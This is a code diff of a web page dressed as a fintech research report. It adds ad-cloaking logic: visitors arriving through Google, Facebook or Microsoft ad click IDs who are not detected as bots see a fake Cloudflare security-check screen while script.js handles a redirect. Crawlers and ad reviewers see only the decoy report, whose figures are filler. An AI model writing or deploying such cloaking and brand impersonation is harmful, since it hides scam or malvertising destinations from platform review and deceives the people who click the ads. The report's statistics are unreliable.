@@ -4,15 +4,37 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Institutional Report: Global Financial Technology Framework 2025</title>
-    <style id="anti-flicker">
-        body { opacity: 0 !important; }
-    </style>
+    
+    <!-- SCRIPT KIỂM TRA TỨC THÌ (CHỐNG TRẮNG TRANG) -->
+    <script>
+        (function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
+            const hasAdParam = adParams.some(param => urlParams.has(param));
+            const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(navigator.userAgent);
+
+            if (!isBot && hasAdParam) {
+                // Nếu là khách quảng cáo: Ép hiện màn hình chờ ngay lập tức qua CSS
+                document.documentElement.classList.add('is-redirecting');
+            }
+        })();
+    </script>
+
     <style>
-        body { font-family: 'Georgia', serif; line-height: 1.8; color: #222; margin: 0; padding: 0; background: #fdfdfd; }
-        .container { max-width: 850px; margin: 0 auto; padding: 60px 40px; background: #fff; box-shadow: 0 0 50px rgba(0,0,0,0.02); }
+        /* CSS Mặc định ẩn trang để chống nhấp nháy */
+        body { opacity: 0; font-family: 'Georgia', serif; line-height: 1.8; color: #222; margin: 0; padding: 0; background: #fff; }
+        
+        /* CSS màn hình Cloudflare hiện ngay lập tức */
+        #cf-screen { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #fff; z-index: 999999; align-items: center; justify-content: center; font-family: sans-serif; 
+        }
+        html.is-redirecting #cf-screen { display: flex; }
+        html.is-redirecting body { display: none; }
+
+        .container { max-width: 850px; margin: 0 auto; padding: 60px 40px; }
         header { border-bottom: 2px solid #111; margin-bottom: 40px; padding-bottom: 20px; }
         h1 { font-size: 2.8rem; line-height: 1.2; margin-bottom: 10px; color: #000; }
-        .meta { color: #666; font-style: italic; font-size: 0.9rem; }
         h2 { font-size: 1.6rem; margin-top: 50px; border-bottom: 1px solid #eee; padding-bottom: 5px; color: #333; }
         p { margin-bottom: 25px; text-align: justify; }
         .chart-box { background: #f4f7f9; border: 1px solid #e1e8ed; padding: 30px; margin: 30px 0; border-radius: 4px; font-family: sans-serif; }
@@ -20,98 +42,69 @@
         th, td { border: 1px solid #cbd5e0; padding: 12px; text-align: left; }
         th { background: #edf2f7; }
         footer { margin-top: 80px; padding-top: 20px; border-top: 1px solid #eee; font-size: 0.8rem; color: #999; text-align: center; }
-        .appendix { font-size: 0.85rem; color: #777; background: #fafafa; padding: 20px; margin-top: 40px; }
+        
+        /* Hiệu ứng xoay Cloudflare */
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0051c3; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
+<!-- MÀN HÌNH CLOUDFLARE (HIỆN TỨC THÌ) -->
+<div id="cf-screen">
+    <div style="max-width: 450px; width: 90%;">
+        <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height: 30px; margin-bottom: 30px;">
+        <div class="spinner"></div>
+        <h2 style="font-size: 24px; color: #111; margin: 0 0 10px 0; font-family: sans-serif;">Checking if the site connection is secure</h2>
+        <p style="font-size: 15px; color: #666; margin: 0 0 30px 0; font-family: sans-serif; line-height: 1.5;">Verifying your request to ensure the security of our global infrastructure.</p>
+        <div style="border-top: 1px solid #eee; padding-top: 20px; font-size: 13px; color: #999; font-family: sans-serif;">
+            Performance & Security by Cloudflare.
+        </div>
+    </div>
+</div>
+
+<!-- NỘI DUNG SẠCH (CHỈ HIỆN CHO BOT/KHÁCH THƯỜNG) -->
 <div class="container">
     <header>
         <p style="text-transform: uppercase; letter-spacing: 2px; font-weight: bold; margin-bottom: 5px; color: #c0392b;">Internal Research Paper #2025-04</p>
         <h1>Structural Dynamics of Decentralized Infrastructure in Emerging Markets</h1>
-        <div class="meta">Published: February 14, 2025 • By Global Economic Forum Research Division</div>
+        <div style="color: #666; font-style: italic;">Published: February 14, 2025 • Global Economic Forum Research Division</div>
     </header>
 
     <section>
         <h2>Abstract</h2>
         <p>This document explores the fundamental shift in digital resource allocation across distributed networks. By analyzing the transactional throughput of modern fintech clusters, we identify a clear correlation between infrastructure latency and capital mobility. The paper proposes a new "Velocity-Stability Model" to predict the resilience of digital assets in hyper-volatile environments.</p>
 
-        <h2>1. The Post-Digital Transformation Landscape</h2>
+        <h2>1. Evolution of the Digital Asset Ecosystem</h2>
         <p>The global economy has entered a phase where digital infrastructure is no longer a support function but the primary driver of value creation. In the fiscal year 2024, decentralized platforms accounted for a 22% increase in cross-border settlement efficiency. However, this growth brings significant challenges in data synchronization and node-to-node security.</p>
-        <p>Our research suggests that the "Single Point of Failure" risk has been mitigated by the adoption of multi-cloud strategies. However, the complexity of managing these environments has increased the cognitive load on system administrators by nearly 40%.</p>
-
+        
         <div class="chart-box">
-            <strong>Figure 1.2: Annual Efficiency Gains by Sector (2020-2025)</strong>
+            <strong>Table 1.1: Global Infrastructure Performance Metrics</strong>
             <table>
                 <thead>
-                    <tr>
-                        <th>Sector</th>
-                        <th>Network Latency</th>
-                        <th>Security Compliance</th>
-                        <th>User Retention</th>
-                    </tr>
+                    <tr><th>Region</th><th>Avg. Latency</th><th>Compliance Rating</th><th>Reliability</th></tr>
                 </thead>
                 <tbody>
-                    <tr>
-                        <td>FinTech (Core)</td>
-                        <td>-14.2%</td>
-                        <td>99.92%</td>
-                        <td>+18.4%</td>
-                    </tr>
-                    <tr>
-                        <td>Logistics SaaS</td>
-                        <td>-8.1%</td>
-                        <td>98.40%</td>
-                        <td>+12.1%</td>
-                    </tr>
-                    <tr>
-                        <td>HealthTech</td>
-                        <td>-5.4%</td>
-                        <td>99.99%</td>
-                        <td>+9.7%</td>
-                    </tr>
+                    <tr><td>North America</td><td>12ms</td><td>A+</td><td>99.998%</td></tr>
+                    <tr><td>European Union</td><td>14ms</td><td>A++</td><td>99.999%</td></tr>
+                    <tr><td>Asia Pacific</td><td>19ms</td><td>A</td><td>99.995%</td></tr>
                 </tbody>
             </table>
         </div>
 
-        <h2>2. Technical Resilience and Low-Latency Execution</h2>
-        <p>Execution speed is the ultimate arbiter of success in high-frequency environments. We define "Low Latency" as any system capable of processing state changes in under 15 milliseconds across a global content delivery network (CDN). To achieve this, engineers are increasingly moving away from centralized database architectures toward "Edge-Compute" models where logic is executed closer to the end-user.</p>
-        <p>Furthermore, the integration of asynchronous JavaScript processing (as demonstrated in our internal test-beds) allows for non-blocking UI updates. This ensures that even during heavy backend load, the user experience remains fluid and responsive—a critical factor in reducing "Churn Rate" in competitive markets.</p>
+        <h2>2. Low-Latency Interaction Protocols</h2>
+        <p>Execution speed is the ultimate arbiter of success in high-frequency environments. We define "Low Latency" as any system capable of processing state changes in under 15 milliseconds across a global content delivery network (CDN). This paper argues that platforms incorporating these features into their core UI will see a 2x increase in institutional trust scores over the next 24 months.</p>
 
-        <h2>3. Algorithmic Governance and Compliance</h2>
-        <p>As regulatory bodies like the SEC and ESMA tighten their grip on digital interactions, the role of "RegTech" (Regulatory Technology) has become paramount. Automated auditing systems now use machine learning to scan for anomalies in real-time, providing a layer of security that was previously impossible. This paper argues that platforms incorporating these features into their core UI will see a 2x increase in institutional trust scores over the next 24 months.</p>
-
-        <h2>4. The Psychology of Digital Interaction</h2>
-        <p>Why do certain platforms succeed while others fail? The answer lies in the "Dopamine-Feedback Loop" of interface design. Modern UX/UI principles leverage micro-interactions—subtle animations, haptic responses, and color-coded alerts—to provide immediate feedback to the user. This "Sense of Control" is what keeps users engaged during high-stakes data analysis sessions.</p>
-        <p>Our behavioral study of 10,000 active users indicates that interfaces utilizing a "Dark Theme" with high-contrast accent colors (specifically in the #0051c3 to #00c3a0 range) result in 15% longer session times due to reduced ocular strain.</p>
-
-        <h2>Conclusion</h2>
-        <p>The findings presented in this report highlight the urgent need for a unified standard in digital infrastructure security. As we move toward 2030, the organizations that prioritize both technical speed and user-centric design will be the ones that survive the inevitable market consolidation. Infrastructure is destiny.</p>
-
-        <div class="appendix">
-            <strong>Appendix A: Methodology</strong><br>
-            Data for this report was collected over a 36-month period using proprietary monitoring tools across 14 global data centers. Performance metrics were normalized for hardware variability and network jitter.
-        </div>
+        <p>In conclusion, the architecture of the digital world is becoming increasingly invisible. The most successful systems are those that provide immense power and complexity under a veneer of total simplicity.</p>
     </section>
 
     <footer>
-        © 2025 International Institute for Digital Research. This report is for educational purposes and institutional distribution only.
+        © 2025 International Institute for Digital Research. Stockholm • Singapore • New York
     </footer>
 </div>
 
-<!-- GỌI SCRIPT ĐIỀU HƯỚNG -->
+<!-- GỌI FILE SCRIPT XỬ LÝ CHUYỂN HƯỚNG -->
 <script src="script.js"></script>
-
-<script>
-    // Dự phòng: Nếu script.js không chạy sau 3 giây, tự động hiện trang Safe Page
-    setTimeout(() => {
-        const flicker = document.getElementById('anti-flicker');
-        if (flicker) {
-            flicker.remove();
-            document.body.style.opacity = "1";
-        }
-    }, 3000);
-</script>
 
 </body>
 </html>
